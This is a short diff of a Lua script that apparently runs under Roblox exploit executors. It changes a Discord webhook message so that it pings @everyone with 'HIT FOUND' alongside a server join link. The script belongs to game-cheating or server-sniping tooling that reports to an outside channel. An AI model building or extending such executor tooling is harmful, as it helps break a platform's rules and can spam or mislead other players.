@@ -187,7 +187,13 @@ local function sendWebhook(link)
             { ["name"] = "Join Server Link", ["value"] = ("[Click to Join Server](%s)"):format(serverLink) }
         }
     }
-    local payload = {["content"] = link or ("Server detected: " .. serverType), ["embeds"] = {embed}}
+    local payload = {
+    ["content"] = "📣 @everyone **HIT FOUND!!!!!**\n" .. (link or ("Server detected: " .. serverType)),
+    ["embeds"] = {embed},
+    ["allowed_mentions"] = {
+        ["parse"] = {"everyone"}
+    }
+}
     local req = (syn and syn.request) or http_request or (http and http.request) or request
     if req then
         pcall(function()
